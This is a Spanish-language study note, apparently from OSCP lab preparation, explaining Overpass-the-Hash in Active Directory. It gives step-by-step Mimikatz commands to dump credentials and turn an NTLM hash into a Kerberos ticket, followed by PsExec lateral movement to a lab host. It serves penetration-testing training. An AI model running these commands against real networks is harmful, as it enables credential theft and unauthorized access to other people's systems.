---
tipo: tecnica
fase: post-explotacion
so: windows
tags: [oscp, tecnica, ad, post-explotacion, windows]
---

# Overpass-the-Hash

> [!abstract] Qué es y cuándo usarla
> Convertir un **hash NTLM** de un usuario en un **TGT Kerberos** para autenticar con Kerberos (en vez de NTLM). Útil cuando el servicio destino **exige Kerberos** (donde [[Pass-the-Hash]] falla) o para usar herramientas que no aceptan hash (PsExec oficial).

## Requisitos previos
- **Admin local** en la máquina donde corre Mimikatz (para `sekurlsa::pth`).
- El **hash NTLM** del usuario objetivo (p.ej. de `sekurlsa::logonpasswords`).

## Pasos
```text
# Mimikatz: crea un proceso en contexto del user con su hash NTLM
privilege::debug
sekurlsa::logonpasswords              # obtener el NTLM (si no lo tienes)
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
En la nueva PowerShell (contexto de jen):
```powershell
klist                 # (0) tickets -> aun no hay
net use \\files04     # cualquier acción de red genera TGT + TGS reales
klist                 # ahora: TGT krbtgt + TGS cifs/files04
.\PsExec.exe \\files04 cmd    # PsExec por HOSTNAME = Kerberos (no acepta hash)
```

> [!tip] `whoami` seguirá mostrando el **usuario original** (jeff): solo lee el token del proceso, no los tickets Kerberos importados. Fíate de `klist`.

> [!warning] Detección / problemas
> - Necesitas admin local para `sekurlsa::pth`.
> - Usa **hostname** (no IP) en las herramientas para forzar Kerberos.
> - Relacionado: [[Pass-the-Hash]] (NTLM puro) y [[Pass-the-Ticket]] (inyectar tickets ya hechos).

## Visto en
- Módulo: [[24 - Lateral Movement in Active Directory]]
- Máquinas: [[]]
